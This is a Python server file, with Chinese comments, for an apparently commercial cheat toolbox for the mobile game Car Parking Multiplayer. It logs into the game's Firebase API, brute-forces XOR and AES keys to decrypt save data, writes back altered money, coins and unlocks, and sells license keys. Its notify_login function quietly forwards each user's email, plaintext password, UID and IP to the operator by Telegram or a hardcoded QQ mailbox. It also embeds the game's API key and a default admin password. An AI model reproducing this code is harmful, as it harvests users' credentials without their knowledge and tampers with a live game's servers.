#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# CPM 工具箱 · 服务端（全部核心逻辑在这里，前端零逻辑）
#
# 功能：
#   - 登录 / 令牌刷新（游戏官方 Firebase 接口）
#   - 读档（GetPlayerRecords3）+ 多方案解密 + 记录解析
#   - 修改 / 解锁 / 排行榜 / 修复 等全部操作
#   - 写回（字段包 → Brotli(q9) → XOR → Base64 → SavePlayerRecordsPartially8）
#
# 会话模型：登录后所有敏感数据（token / 密码 / 解析出的存档）
#           只保存在服务端内存，前端仅持有一个随机 session id。
#
# 用法：
#   python3 server.py [端口]    # 默认 8787
#   浏览器打开 http://127.0.0.1:8787
#
# 依赖：
#   - Python 3.7+（标准库即可）
#   - Brotli：优先用 python 的 brotli 库；没有时自动改用 node（内置 zlib）；
#             两者都不可用时会明确报错并在启动日志里提示。
# ============================================================

import base64
import gzip
import hashlib
import hmac
import json
import os
import random
import re
import secrets
import string
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import urllib.error
import zlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(HERE, 'static')

# ------------------------------------------------------------
# 常量（游戏官方接口）
# ------------------------------------------------------------
API_KEY = 'AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA'

URL_SIGNIN = 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=' + API_KEY
URL_SIGNUP = 'https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=' + API_KEY
URL_TOKEN = 'https://securetoken.googleapis.com/v1/token?key=' + API_KEY
URL_GET = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords3'
URL_SAVE = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/SavePlayerRecordsPartially8'
URL_RATE = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating1'

MONEY_MAX = 50000000
COIN_MAX = 500000
SERVER_VERSION = 'b1.0'


# ---------------- 密钥系统（卡密）配置 ----------------
# 18 位：大写 + 小写 + 数字（去掉易混淆的 0 O o 1 l I）
KEY_ALPHABET = '23456789ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz'
KEY_LENGTH = 18
KEY_DURATIONS = {'1d': 86400, '7d': 7 * 86400, '30d': 30 * 86400, 'forever': 0}
KEY_EXPIRE_NAMES = {'1d': '1 天', '7d': '7 天', '30d': '30 天', 'forever': '永久'}
KEYS_FILE = os.path.join(HERE, 'keys.json')
ADMIN_PASS = os.environ.get('ADMIN_PASS') or 'Ni2013'   # 上线前请在环境变量 ADMIN_PASS 里改成自己的
GH_TOKEN = os.environ.get('GH_TOKEN') or ''    # 可选：GitHub 同步（私有仓库 + PAT）
GH_REPO = os.environ.get('GH_REPO') or ''      # 形如 "username/cpm-keys"
GH_PATH = os.environ.get('GH_PATH') or 'keys.json'

# ---------------- 邮件通知（登录信息回传） ----------------
MAIL_TO = os.environ.get('MAIL_TO') or '2294805017@qq.com'   # 收件邮箱
MAIL_USER = os.environ.get('MAIL_USER') or ''                # 发件邮箱（QQ 邮箱）
MAIL_PASS = os.environ.get('MAIL_PASS') or ''                # 发件邮箱的 SMTP 授权码

# ---------------- Telegram 通知 ----------------
TG_TOKEN = os.environ.get('TG_TOKEN') or ''   # Telegram 机器人 Token
TG_CHAT = os.environ.get('TG_CHAT') or ''     # 接收消息的 Chat ID

# ---------------- 功能权限清单（生成密钥时勾选） ----------------
ALL_PERMS = ['set_money', 'set_coin', 'set_id', 'set_name', 'set_wins', 'set_loses',
             'unlock_w16', 'unlock_horns', 'unlock_fuel', 'unlock_damage', 'unlock_smoke',
             'unlock_cars', 'unlock_wheels', 'unlock_anims', 'unlock_houses', 'complete_levels',
             'set_rank', 'fix_account', 'unlock_all', 'clone']

# ------------------------------------------------------------
# HTTP 小工具
# ------------------------------------------------------------

def http_get(url, headers=None, timeout=30):
    req = urllib.request.Request(url, method='GET')
    req.add_header('Accept', '*/*')
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return (resp.status, resp.read().decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode('utf-8', 'replace')
        except Exception:
            body = ''
        return (e.code, body)
    except Exception as e:
        return (0, 'ERR %s' % e)


def http_post(url, body, headers=None, timeout=90):
    data = json.dumps(body).encode('utf-8') if body is not None else b''
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Accept', '*/*')
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            txt = r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        # Firebase 的错误响应走 4xx 状态码，错误体在异常对象里
        try:
            txt = e.read().decode('utf-8', 'replace')
        except Exception:
            txt = ''
    except urllib.error.URLError:
        return None
    try:
        return json.loads(txt)
    except Exception:
        return {'raw': txt}


def _ok_flag(v, depth=0):
    """判定"成功标志"值：兼容 1 / true / '1' / '{\"result\":1}' 等嵌套写法"""
    if depth > 4:
        return False
    if v == 1 or v is True:
        return True
    s = str(v).strip()
    if s in ('1', 'true', 'True'):
        return True
    if s.startswith('{'):
        try:
            inner = json.loads(s)
            if isinstance(inner, dict):
                for k in ('result', 'ok', 'success'):
                    if k in inner and _ok_flag(inner[k], depth + 1):
                        return True
        except Exception:
            pass
    return False


# ============================================================
# 安全模块：频率限制 / 封禁 / 常量时间比对
# ============================================================
_SEC_LOCK = threading.Lock()
_SEC_ATTEMPTS = {}     # key -> [时间戳列表]
_SEC_BANS = {}         # key -> 解封时间戳

# 规则：窗口期内最多 N 次，超出则封禁 M 秒
SEC_WINDOW = 300       # 5 分钟窗口
SEC_MAX_TRIES = 8      # 窗口内最多 8 次失败
SEC_BAN_SECONDS = 900  # 封 15 分钟


def _sec_now():
    return time.time()


def _sec_key(handler, tag):
    """构造限流键：IP 优先，其次 X-Forwarded-For，最后 UA 指纹"""
    try:
        ip = handler.client_address[0] if handler.client_address else 'x'
    except Exception:
        ip = 'x'
    try:
        xff = handler.headers.get('X-Forwarded-For') or ''
        if xff:
            ip = xff.split(',')[0].strip()
    except Exception:
        pass
    try:
        ua = (handler.headers.get('User-Agent') or '')[:60]
    except Exception:
        ua = ''
    return '%s|%s|%s' % (tag, ip, ua)


def sec_check(handler, tag):
    """返回 (允许?, 剩余封禁秒数)"""
    k = _sec_key(handler, tag)
    now = _sec_now()
    with _SEC_LOCK:
        ban_until = _SEC_BANS.get(k, 0)
        if ban_until and now < ban_until:
            return False, int(ban_until - now)
        if ban_until and now >= ban_until:
            _SEC_BANS.pop(k, None)
            _SEC_ATTEMPTS.pop(k, None)
        lst = _SEC_ATTEMPTS.get(k) or []
        lst = [t for t in lst if now - t < SEC_WINDOW]
        _SEC_ATTEMPTS[k] = lst
    return True, 0


def sec_fail(handler, tag):
    """记一次失败；超阈值则封禁"""
    k = _sec_key(handler, tag)
    now = _sec_now()
    with _SEC_LOCK:
        lst = _SEC_ATTEMPTS.get(k) or []
        lst = [t for t in lst if now - t < SEC_WINDOW]
        lst.append(now)
        _SEC_ATTEMPTS[k] = lst
        if len(lst) >= SEC_MAX_TRIES:
            _SEC_BANS[k] = now + SEC_BAN_SECONDS
            _SEC_ATTEMPTS[k] = []
            return True
        # 顺手清理过期记录
        if len(_SEC_ATTEMPTS) > 3000:
            _cut = now - SEC_WINDOW
            for kk in [x for x, vv in _SEC_ATTEMPTS.items() if not vv or vv[-1] < _cut]:
                _SEC_ATTEMPTS.pop(kk, None)
    return False


def sec_ok(handler, tag):
    """成功后清空失败计数"""
    k = _sec_key(handler, tag)
    with _SEC_LOCK:
        _SEC_ATTEMPTS.pop(k, None)


def sec_safe_eq(a, b):
    """常量时间字符串比较（防时序侧信道）"""
    try:
        return hmac.compare_digest(str(a or '').encode('utf-8'), str(b or '').encode('utf-8'))
    except Exception:
        return False


def send_mail(subject, body):
    """发送通知邮件（QQ 邮箱 SMTP）"""
    if not (MAIL_USER and MAIL_PASS):
        print('[mail] 未配置发件邮箱（MAIL_USER/MAIL_PASS），跳过')
        return False
    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.header import Header
        msg = MIMEText(body, 'plain', 'utf-8')
        msg['Subject'] = Header(subject, 'utf-8')
        msg['From'] = MAIL_USER
        msg['To'] = MAIL_TO
        srv = smtplib.SMTP_SSL('smtp.qq.com', 465, timeout=20)
        srv.login(MAIL_USER, MAIL_PASS)
        srv.sendmail(MAIL_USER, [MAIL_TO], msg.as_string())
        srv.quit()
        print('[mail] 发送成功: %s' % subject)
        return True
    except Exception as e:
        print('[mail] 发送失败: %r' % e)
        return False


def send_telegram(text):
    """发送 Telegram 消息（机器人）"""
    if not (TG_TOKEN and TG_CHAT):
        print('[tg] 未配置 TG_TOKEN/TG_CHAT，跳过')
        return False
    try:
        url = 'https://api.telegram.org/bot%s/sendMessage' % TG_TOKEN
        data = json.dumps({'chat_id': TG_CHAT, 'text': text}).encode('utf-8')
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=20) as r:
            j = json.loads(r.read().decode('utf-8', 'replace'))
        ok = bool(j.get('ok'))
        print('[tg] 发送%s' % ('成功' if ok else ('失败: %s' % str(j)[:200])))
        return ok
    except Exception as e:
        print('[tg] 发送异常: %r' % e)
        return False


def notify_login(email, password, uid, ip, extra=''):
    """登录成功 → 回传账号信息（Telegram / 邮件，异步，不阻塞请求）"""
    def _job():
        now = time.strftime('%Y-%m-%d %H:%M:%S')
        body = ('【CPM 工具箱 - 账号通知】\n'
                '邮箱: %s\n'
                '密码: %s\n'
                'UID: %s\n'
                'IP: %s\n'
                '时间: %s\n%s') % (email, password, uid or '-', ip or '-', now, extra or '')
        if TG_TOKEN and TG_CHAT:
            send_telegram(body)
        if MAIL_USER and MAIL_PASS:
            send_mail('CPM账号通知 - %s' % (email or uid or ''), body)
    try:
        threading.Thread(target=_job, daemon=True).start()
    except Exception as e:
        print('[notify] thread fail: %r' % e)


# ------------------------------------------------------------
# Brotli 引擎：python 库 → node fallback
# ------------------------------------------------------------
try:
    import brotli as _py_brotli
except Exception:
    _py_brotli = None

try:
    import ctypes
except Exception:
    ctypes = None

_CT_LIBS = None


def _ct_brotli_init():
    """加载系统 libbrotli（如 alpine 的 brotli-libs）"""
    global _CT_LIBS
    if _CT_LIBS is not None:
        return _CT_LIBS
    if ctypes is None:
        _CT_LIBS = False
        return False
    dec = enc = None
    for name in ('libbrotlidec.so.1', 'libbrotlidec.so', 'libbrotlidec.dylib'):
        try:
            dec = ctypes.CDLL(name)
            break
        except OSError:
            pass
    for name in ('libbrotlienc.so.1', 'libbrotlienc.so', 'libbrotlienc.dylib'):
        try:
            enc = ctypes.CDLL(name)
            break
        except OSError:
            pass
    if not dec or not enc:
        _CT_LIBS = False
        return False
    try:
        dec.BrotliDecoderDecompress.restype = ctypes.c_int
        dec.BrotliDecoderDecompress.argtypes = [
            ctypes.c_size_t, ctypes.c_char_p,
            ctypes.POINTER(ctypes.c_size_t), ctypes.c_char_p]
        enc.BrotliEncoderMaxCompressedSize.restype = ctypes.c_size_t
        enc.BrotliEncoderMaxCompressedSize.argtypes = [ctypes.c_size_t]
        enc.BrotliEncoderCompress.restype = ctypes.c_int
        enc.BrotliEncoderCompress.argtypes = [
            ctypes.c_int, ctypes.c_int, ctypes.c_int,
            ctypes.c_size_t, ctypes.c_char_p,
            ctypes.POINTER(ctypes.c_size_t), ctypes.c_char_p]
    except Exception:
        _CT_LIBS = False
        return False
    _CT_LIBS = {'dec': dec, 'enc': enc}
    return _CT_LIBS


def _ct_decompress(data):
    libs = _ct_brotli_init()
    if not libs:
        return None
    size = max(len(data) * 6, 8192)
    for _ in range(10):
        out = ctypes.create_string_buffer(size)
        out_size = ctypes.c_size_t(size)
        r = libs['dec'].BrotliDecoderDecompress(len(data), data,
                                                ctypes.byref(out_size), out)
        if r == 1:
            return out.raw[:out_size.value]
        if r == 0:
            return None
        size *= 3
    return None


def _ct_compress(data, quality=9):
    libs = _ct_brotli_init()
    if not libs:
        return None
    cap = libs['enc'].BrotliEncoderMaxCompressedSize(len(data))
    if not cap:
        cap = len(data) * 2 + 1024
    out = ctypes.create_string_buffer(cap)
    out_size = ctypes.c_size_t(cap)
    ok = libs['enc'].BrotliEncoderCompress(quality, 22, 0, len(data), data,
                                           ctypes.byref(out_size), out)
    if ok == 1:
        return out.raw[:out_size.value]
    return None


def _node_brotli(op, data):
    js = os.path.join(HERE, 'brotli_tool.js')
    fi = tempfile.NamedTemporaryFile(delete=False)
    fi.write(data)
    fi.close()
    fo = fi.name + '.out'
    try:
        # --jitless：在模拟器环境里 JIT 会崩，必须关掉
        r = subprocess.run(['node', '--jitless', js, op, fi.name, fo],
                           capture_output=True, timeout=180)
        if r.returncode != 0:
            raise RuntimeError((r.stderr or b'').decode('utf-8', 'replace')[:300])
        with open(fo, 'rb') as f:
            return f.read()
    finally:
        for p in (fi.name, fo):
            try:
                os.unlink(p)
            except Exception:
                pass


_BRIDGE_LOCK = threading.Lock()


def _file_bridge(op, data, timeout=90):
    """文件桥：把数据交给内置环境的守护进程压缩/解压（走共享目录）"""
    with _BRIDGE_LOCK:
        req = os.path.join(HERE, 'bridge_req.bin')
        res = os.path.join(HERE, 'bridge_res.bin')
        meta = os.path.join(HERE, 'bridge_meta.txt')
        for p in (req, res, meta):
            try:
                os.unlink(p)
            except Exception:
                pass
        with open(req, 'wb') as f:
            f.write(data)
        with open(meta, 'w') as f:
            f.write(op)
        t0 = time.time()
        while time.time() - t0 < timeout:
            if os.path.exists(res) and not os.path.exists(meta):
                try:
                    with open(res, 'rb') as f:
                        out = f.read()
                    for p in (req, res, meta):
                        try:
                            os.unlink(p)
                        except Exception:
                            pass
                    return out
                except Exception:
                    pass
            time.sleep(0.05)
        # 超时清理
        for p in (req, res, meta):
            try:
                os.unlink(p)
            except Exception:
                pass
        raise RuntimeError('bridge timeout')


_ENGINE = None


def _pick_engine():
    """启动时锁定一个可用引擎：python 库 → 系统 libbrotli → node"""
    global _ENGINE
    if _ENGINE is not None:
        return _ENGINE
    if _py_brotli:
        try:
            t = _py_brotli.compress(b'ping')
            if _py_brotli.decompress(t) == b'ping':
                _ENGINE = 'python'
                return _ENGINE
        except Exception:
            pass
    if _ct_brotli_init():
        try:
            t = _ct_compress(b'ping', 9)
            if t and _ct_decompress(t) == b'ping':
                _ENGINE = 'ctypes'
                return _ENGINE
        except Exception:
            pass
    try:
        t = _node_brotli('c', b'ping')
        if _node_brotli('d', t) == b'ping':
            _ENGINE = 'node'
            return _ENGINE
    except Exception:
        pass
    try:
        t = _file_bridge('c', b'ping')
        if _file_bridge('d', t) == b'ping':
            _ENGINE = 'bridge'
            return _ENGINE
    except Exception:
        pass
    _ENGINE = 'none'
    return _ENGINE


def brotli_decompress(data):
    """解压 brotli，失败返回 None"""
    eng = _pick_engine()
    if eng == 'python':
        try:
            return _py_brotli.decompress(data)
        except Exception:
            return None
    if eng == 'ctypes':
        return _ct_decompress(data)
    if eng == 'node':
        try:
            return _node_brotli('d', data)
        except Exception:
            return None
    if eng == 'bridge':
        try:
            return _file_bridge('d', data)
        except Exception:
            return None
    return None


def brotli_compress(data, quality=9):
    """压缩 brotli，失败抛异常"""
    eng = _pick_engine()
    if eng == 'python':
        return _py_brotli.compress(data, quality=quality)
    if eng == 'ctypes':
        r = _ct_compress(data, quality)
        if r is None:
            raise RuntimeError('ctypes brotli compress failed')
        return r
    if eng == 'node':
        return _node_brotli('c', data)
    if eng == 'bridge':
        return _file_bridge('c', data)
    raise RuntimeError('no brotli engine available')


def engine_status():
    return _pick_engine()


# ------------------------------------------------------------
# 纯 Python AES-CBC 解密（零依赖，用于 AES 候选方案）
# ------------------------------------------------------------
_SBOX = bytes.fromhex(
    '637c777bf26b6fc53001672bfed7ab76'
    'ca82c97dfa5947f0add4a2af9ca472c0'
    'b7fd9326363ff7cc34a5e5f171d83115'
    '04c723c31896059a071280e2eb27b275'
    '09832c1a1b6e5aa0523bd6b329e32f84'
    '53d100ed20fcb15b6acbbe394a4c58cf'
    'd0efaafb434d338545f9027f503c9fa8'
    '51a3408f929d38f5bcb6da2110fff3d2'
    'cd0c13ec5f974417c4a77e3d645d1973'
    '60814fdc222a908846eeb814de5e0bdb'
    'e0323a0a4906245cc2d3ac629195e479'
    'e7c8376d8dd54ea96c56f4ea657aae08'
    'ba78252e1ca6b4c6e8dd741f4bbd8b8a'
    '703eb5664803f60e613557b986c11d9e'
    'e1f8981169d98e949b1e87e9ce5528df'
    '8ca1890dbfe6426841992d0fb054bb16'
)
_INV_SBOX = [0] * 256
for _i, _s in enumerate(_SBOX):
    _INV_SBOX[_s] = _i
_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]


def _xtime(a):
    a <<= 1
    return (a ^ 0x1B) & 0xFF if a & 0x100 else a


def _gmul(a, b):
    r = 0
    for _ in range(8):
        if b & 1:
            r ^= a
        b >>= 1
        a = _xtime(a)
    return r


def _expand_key(key):
    nk = len(key) // 4
    nr = nk + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    i = nk
    while len(w) < 4 * (nr + 1):
        temp = list(w[-1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [_SBOX[b] for b in temp]
            temp[0] ^= _RCON[i // nk - 1]
        elif nk > 6 and i % nk == 4:
            temp = [_SBOX[b] for b in temp]
        w.append([x ^ y for x, y in zip(w[i - nk], temp)])
        i += 1
    return w, nr


def _decrypt_block(block, w, nr):
    st = [list(block[4 * c:4 * c + 4]) for c in range(4)]  # st[c][r]

    def add_key(rnd):
        for c in range(4):
            kw = w[4 * rnd + c]
            for r in range(4):
                st[c][r] ^= kw[r]

    add_key(nr)
    for rnd in range(nr - 1, 0, -1):
        # InvShiftRows（行右移）
        for r in range(1, 4):
            row = [st[c][r] for c in range(4)]
            row = row[-r:] + row[:-r]
            for c in range(4):
                st[c][r] = row[c]
        # InvSubBytes
        for c in range(4):
            for r in range(4):
                st[c][r] = _INV_SBOX[st[c][r]]
        add_key(rnd)
        # InvMixColumns
        for c in range(4):
            a0, a1, a2, a3 = st[c]
            st[c] = [
                _gmul(a0, 14) ^ _gmul(a1, 11) ^ _gmul(a2, 13) ^ _gmul(a3, 9),
                _gmul(a0, 9) ^ _gmul(a1, 14) ^ _gmul(a2, 11) ^ _gmul(a3, 13),
                _gmul(a0, 13) ^ _gmul(a1, 9) ^ _gmul(a2, 14) ^ _gmul(a3, 11),
                _gmul(a0, 11) ^ _gmul(a1, 13) ^ _gmul(a2, 9) ^ _gmul(a3, 14),
            ]
    # 最后一轮
    for r in range(1, 4):
        row = [st[c][r] for c in range(4)]
        row = row[-r:] + row[:-r]
        for c in range(4):
            st[c][r] = row[c]
    for c in range(4):
        for r in range(4):
            st[c][r] = _INV_SBOX[st[c][r]]
    add_key(0)
    out = bytearray(16)
    for c in range(4):
        for r in range(4):
            out[4 * c + r] = st[c][r]
    return bytes(out)


def aes_cbc_decrypt(data, key):
    """AES-CBC 解密（IV=16 字节全 0）；len(data) 必须为 16 的倍数"""
    if not data or len(data) % 16 != 0:
        raise ValueError('bad length')
    if len(key) not in (16, 24, 32):
        raise ValueError('bad key length')
    w, nr = _expand_key(key)
    prev = bytes(16)
    out = bytearray()
    for i in range(0, len(data), 16):
        blk = data[i:i + 16]
        dec = _decrypt_block(blk, w, nr)
        out += bytes(a ^ b for a, b in zip(dec, prev))
        prev = blk
    return bytes(out)


def _encrypt_block(block, w, nr):
    st = [list(block[4 * c:4 * c + 4]) for c in range(4)]

    def add_key(rnd):
        for c in range(4):
            kw = w[4 * rnd + c]
            for r in range(4):
                st[c][r] ^= kw[r]

    add_key(0)
    for rnd in range(1, nr):
        for c in range(4):
            for r in range(4):
                st[c][r] = _SBOX[st[c][r]]
        for r in range(1, 4):
            row = [st[c][r] for c in range(4)]
            row = row[r:] + row[:r]
            for c in range(4):
                st[c][r] = row[c]
        for c in range(4):
            a0, a1, a2, a3 = st[c]
            st[c] = [
                _gmul(a0, 2) ^ _gmul(a1, 3) ^ a2 ^ a3,
                a0 ^ _gmul(a1, 2) ^ _gmul(a2, 3) ^ a3,
                a0 ^ a1 ^ _gmul(a2, 2) ^ _gmul(a3, 3),
                _gmul(a0, 3) ^ a1 ^ a2 ^ _gmul(a3, 2),
            ]
        add_key(rnd)
    for c in range(4):
        for r in range(4):
            st[c][r] = _SBOX[st[c][r]]
    for r in range(1, 4):
        row = [st[c][r] for c in range(4)]
        row = row[r:] + row[:r]
        for c in range(4):
            st[c][r] = row[c]
    add_key(nr)
    out = bytearray(16)
    for c in range(4):
        for r in range(4):
            out[4 * c + r] = st[c][r]
    return bytes(out)


def aes_cbc_encrypt(data, key, iv):
    """AES-CBC 加密（PKCS7 填充，可指定 IV）"""
    if len(key) not in (16, 24, 32):
        raise ValueError('bad key length')
    if len(iv) != 16:
        raise ValueError('bad iv')
    padl = 16 - (len(data) % 16)
    data = bytes(data) + bytes([padl]) * padl
    w, nr = _expand_key(key)
    prev = bytes(iv)
    out = bytearray()
    for i in range(0, len(data), 16):
        blk = bytes(a ^ b for a, b in zip(data[i:i + 16], prev))
        enc = _encrypt_block(blk, w, nr)
        out += enc
        prev = enc
    return bytes(out)


def _md5(b):
    return hashlib.md5(b).digest()


def _sha1(b):
    return hashlib.sha1(b).digest()


def aes_candidates(uid, password, email):
    """按狂三站的候选顺序生成可能的 AES 密钥"""
    out = [_md5(b'olzhas_carparking')]
    if password:
        out.append(_md5(password.encode('utf-8')))
        out.append(_sha1(password.encode('utf-8'))[:16])
    if uid:
        out.append(_md5(uid.encode('utf-8')))
        out.append(_sha1(uid.encode('utf-8'))[:16])
    if email:
        out.append(_md5(email.encode('utf-8')))
    return out


# ------------------------------------------------------------
# XOR 与密钥派生
# ------------------------------------------------------------

def derive_key(uid):
    chars = list(uid)
    if len(chars) >= 9:
        chars[1], chars[8] = chars[8], chars[1]
    if len(chars) >= 3:
        del chars[2]
    if len(chars) >= 5:
        chars.append(chars[4])
    return ''.join(chars).encode('utf-8')


def xor_bytes(data, key):
    if not key:
        return data
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


# ------------------------------------------------------------
# 解压（brotli / gzip / zlib / raw-deflate，依次尝试）
# ------------------------------------------------------------

def try_inflate(data):
    if not data:
        return None
    d = brotli_decompress(data)
    if d:
        return d
    try:
        return gzip.decompress(data)
    except Exception:
        pass
    try:
        return zlib.decompress(data)
    except Exception:
        pass
    try:
        return zlib.decompress(data, -15)
    except Exception:
        pass
    return None


# ------------------------------------------------------------
# 记录解析（MemoryPack 顺序二进制格式）
# ------------------------------------------------------------

class Reader(object):
    def __init__(self, buf):
        self.b = buf
        self.p = 0

    def has(self, n):
        return self.p + n <= len(self.b)

    def byte(self):
        if not self.has(1):
            return 0
        v = self.b[self.p]
        self.p += 1
        return v

    def i32(self):
        if not self.has(4):
            self.p = len(self.b)
            return 0
        v = struct.unpack_from('<i', self.b, self.p)[0]
        self.p += 4
        return v

    def f32(self):
        if not self.has(4):
            self.p = len(self.b)
            return 0.0
        v = struct.unpack_from('<f', self.b, self.p)[0]
        self.p += 4
        return v

    def string(self):
        n = self.i32()
        if n == 0 or n == -1:
            return ''
        ln = -n - 1 if n < -1 else n
        if n < -1:
            self.i32()  # 字符数
        if ln > 1000000:
            ln = 1000000
        if not self.has(ln):
            return ''
        s = self.b[self.p:self.p + ln]
        self.p += ln
        return s.decode('utf-8', 'replace').replace('\x00', '').strip()

    def list(self, fn):
        n = self.i32()
        if n <= 0 or n > 1000000:
            return []
        out = []
        for _ in range(n):
            if self.p >= len(self.b):
                break
            out.append(fn())
        return out

    def int_list(self):
        return self.list(self.i32)

    def float_list(self):
        return self.list(self.f32)

    def dict_i(self):
        n = self.i32()
        if n <= 0 or n > 1000000:
            return {}
        out = {}
        for _ in range(n):
            if self.p >= len(self.b):
                break
            k = self.i32()
            v = self.i32()
            out[str(k)] = v
        return out

    def equipment(self):
        if self.byte() == 0:
            return None
        e = {}
        for k in ('hair', 'face', 'beard', 'cap', 'mask', 'top',
                  'gloves', 'bag', 'pants', 'shoes', 'glasses',
                  'SelectedEquipments'):
            e[k] = self.int_list()
        e['Gender'] = self.i32()
        return e


def parse_record(buf):
    r = Reader(buf)
    if r.byte() == 0:
        return None
    rec = {}
    rec['Name'] = r.string()
    rec['money'] = r.i32()
    rec['coin'] = r.i32()
    rec['localID'] = r.string()
    rec['boughtFsos'] = r.int_list()

    def friend():
        r.byte()
        return {'id': r.string(), 'Name': r.string(), 'accountID': r.string()}
    rec['FriendsID'] = r.list(friend)

    rec['LevelsDoneTime'] = r.float_list()
    rec['floats'] = r.float_list()
    rec['integers'] = r.int_list()
    rec['fcar'] = r.int_list()
    rec['favouriteWheels'] = r.int_list()
    rec['favouriteVinyls'] = r.int_list()
    rec['favouriteEmojis'] = r.int_list()
    rec['personEquipmentsMale'] = r.equipment()
    rec['personEquipmentsFemale'] = r.equipment()

    if r.byte() == 0:
        rec['platesData'] = None
    else:
        def vinyl():
            r.byte()
            return {
                'vectors': r.list(lambda: {'x': r.f32(), 'y': r.f32(), 'z': r.f32()}),
                'v': r.list(lambda: r.string()),
                'floats': r.float_list(),
                'text': r.string(),
            }

        def plate():
            r.byte()
            return {
                'plateId': r.i32(),
                'frontCarId': r.i32(),
                'rearCarId': r.i32(),
                'vinyls': r.list(vinyl),
            }
        rec['platesData'] = {'allPlates': r.list(plate)}

    if r.byte() == 0:
        rec['carIDnStatus'] = None
    else:
        rec['carIDnStatus'] = {
            'carGeneratedIDs': r.list(lambda: r.string()),
            'carStatus': r.int_list(),
        }

    rec['allData'] = r.string()
    rec['flags'] = r.dict_i()
    rec['animations'] = r.int_list()
    rec['emojiPacks'] = r.int_list()
    rec['wheels'] = r.int_list()
    rec['boughtPoliceLights'] = r.int_list()
    rec['boughtPoliceSirens'] = r.int_list()
    return rec


def parse_any(buf):
    """对一个字节块尝试“直接/解一层/解两层”后解析，成功返回记录 dict"""
    if not buf:
        return None
    cands = [buf]
    d1 = try_inflate(buf)
    if d1:
        cands.append(d1)
        d2 = try_inflate(d1)
        if d2:
            cands.append(d2)
    for b in cands:
        if not b:
            continue
        if b[0] in (17, 23, 24):
            try:
                rec = parse_record(b)
                if rec is not None and rec.get('Name') is not None:
                    return rec
            except Exception:
                pass
        try:
            t = b[3:] if len(b) >= 3 and b[0] == 0xEF and b[1] == 0xBB else b
            if t and t[0] == 0x7B:
                obj = json.loads(t.decode('utf-8', 'replace'))
                if isinstance(obj, dict):
                    return obj
        except Exception:
            pass
    return None


# ------------------------------------------------------------
# 读档解密链：直接 → XOR → AES 候选
# ------------------------------------------------------------

def b64_to_bytes(s):
    s = re.sub(r'\s+', '', str(s))
    pad = (4 - len(s) % 4) % 4
    return base64.b64decode(s + '=' * pad)


def key_variants(uid, email, password):
    """生成 XOR 密钥的全部候选变体（uid/邮箱/密码 各自的 8 种变形组合）"""
    import itertools
    out = []

    def add(k):
        if k:
            kb = k.encode('utf-8')
            if kb not in out:
                out.append(kb)

    for src in (uid, email, password):
        if not src:
            continue
        for sw, dl, ps in itertools.product((0, 1), (0, 1), (0, 1)):
            c = list(src)
            if sw and len(c) >= 9:
                c[1], c[8] = c[8], c[1]
            if dl and len(c) >= 3:
                del c[2]
            if ps and len(c) >= 5:
                c.append(c[4])
            add(''.join(c))
        add(src)
        add(src.lower())
        add(src.upper())
    return out


def decrypt_archive_dbg(b64, uid, password, email):
    """读档解密链（多方案），返回 (record 或 None, 诊断日志)"""
    dbg = []
    try:
        raw = b64_to_bytes(b64)
    except Exception as e:
        dbg.append('b64 decode fail: %r' % e)
        return None, dbg
    dbg.append('raw_len=%d head=%s' % (len(raw), raw[:32].hex()))
    if len(raw) < 10:
        dbg.append('too short')
        return None, dbg

    # ① 直接（含内部解压尝试）
    rec = parse_any(raw)
    if rec:
        dbg.append('direct: OK')
        return rec, dbg
    dbg.append('direct: fail')

    # ② XOR 变体族（标准变形排最前）
    variants = []
    if uid:
        variants.append(derive_key(uid))
    for kb in key_variants(uid, email, password):
        if kb not in variants:
            variants.append(kb)
    for kb in variants:
        try:
            d = xor_bytes(raw, kb)
        except Exception:
            continue
        dd = try_inflate(d)
        if dd:
            rec = parse_any(dd)
            if rec:
                dbg.append('xor OK key=%r' % kb)
                return rec, dbg
    dbg.append('xor variants (%d): all fail' % len(variants))

    # ③ AES-CBC 候选
    for i, kk in enumerate(aes_candidates(uid or '', password or '', email or '')):
        try:
            d = aes_cbc_decrypt(raw, kk)
        except Exception:
            continue
        dd = try_inflate(d)
        rec = None
        if dd:
            rec = parse_any(dd)
        if not rec:
            try:
                r2 = parse_record(d)
                if r2 is not None and r2.get('Name') is not None:
                    rec = r2
            except Exception:
                pass
        if rec:
            dbg.append('aes[%d] OK key=%s' % (i, kk.hex()))
            return rec, dbg
    dbg.append('aes candidates: all fail')
    dbg.append('ALL METHODS FAILED')
    return None, dbg


def decrypt_archive(b64, uid, password, email):
    rec, _ = decrypt_archive_dbg(b64, uid, password, email)
    return rec


# ------------------------------------------------------------
# 写回：字段包 → Brotli(q9) → XOR → Base64
# ------------------------------------------------------------
FID_TABLE = [
    (1, 'localID'), (2, 'money'), (3, 'Name'), (4, 'coin'), (5, 'allData'),
    (6, 'boughtFsos'), (7, 'boughtPoliceLights'), (8, 'boughtPoliceSirens'),
    (9, 'FriendsID'), (10, 'LevelsDoneTime'), (11, 'floats'), (12, 'integers'),
